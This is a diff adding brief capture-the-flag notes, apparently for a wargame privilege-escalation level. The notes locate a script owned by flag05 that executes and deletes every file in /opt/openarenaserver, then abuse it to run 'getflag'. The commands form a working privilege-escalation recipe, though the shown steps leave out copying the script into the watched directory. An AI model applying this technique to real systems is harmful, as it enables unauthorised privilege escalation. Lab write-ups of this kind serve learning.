@@ -1,0 +1,18 @@
+find / -user flag05 2>/dev/null
+->/usr/sbin/openarenaserver
+strings /usr/sbin/openarenaserver
+->
+#!/bin/sh
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+this shell script execute all file in "/opt/openarenaserver/" with a limit of 5s
+then delete it
+
+echo 'getflag > /tmp/exploit' > script
+->wait a bit
+cat /tmp/exploit
+->flag
+
